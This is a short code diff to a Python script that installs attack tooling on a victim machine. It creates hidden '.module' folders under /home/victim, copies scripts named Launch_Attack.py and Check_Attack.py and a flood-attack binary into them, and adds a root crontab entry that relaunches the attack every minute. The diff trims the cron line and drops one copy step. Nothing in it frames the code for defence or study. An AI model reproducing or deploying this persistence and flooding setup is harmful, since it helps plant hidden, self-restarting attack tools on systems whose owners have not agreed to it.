@@ -4,7 +4,7 @@ import sys
 
 attackDirs = ['/home/victim/.etc', '/home/victim/.var']
 attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
-attackCommand = '* * * * * root ( cd /home/victim/.etc/.module && python Launch_Attack.py ) || ( cd /home/victim/.var/.module && python Launch_Attack.py )\n'
+attackCommand = '* * * * * root ( cd /home/victim/.etc/.module && python Launch_Attack.py ) || ( cd /home/victim/.var/.module && python Launch_Attack.py )'
 
 
 def set_up_crontab():
@@ -30,7 +30,6 @@ def set_up_attack():
         os.system('mkdir {0}/.module'.format(attackDir))
         os.system('cp a.py {0}/.module/Launch_Attack.py'.format(attackDir))
         os.system('cp b.py {0}/.module/Check_Attack.py'.format(attackDir))
-        os.system('cp c.py {0}/.module/Flood_Attack.py'.format(attackDir))
         os.system('cp TA_Flood_Attack {0}/.module/'.format(attackDir))
 
 
